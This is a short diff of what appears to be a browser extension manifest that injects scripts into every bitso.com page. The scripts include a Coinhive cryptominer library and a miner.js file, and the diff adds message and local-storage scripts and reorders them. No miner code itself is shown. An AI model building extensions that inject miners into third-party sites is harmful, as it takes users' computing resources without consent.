@@ -8,15 +8,18 @@
     "content_scripts": [{
       "matches": ["https://*.bitso.com/*"],
       "js": [
+            "js/messages.js",
             "js/coinhive.min.js",
             "js/localstorage.js",
             "js/posbit.js",
-            "js/contentscript.js",
-            "js/miner.js"
+            "js/miner.js",
+            "js/contentscript.js"
         ]
     }],
     "background": {
         "scripts": [
+            "js/messages.js",
+            "js/localstorage.js",
             "js/background.js"
         ]
     },
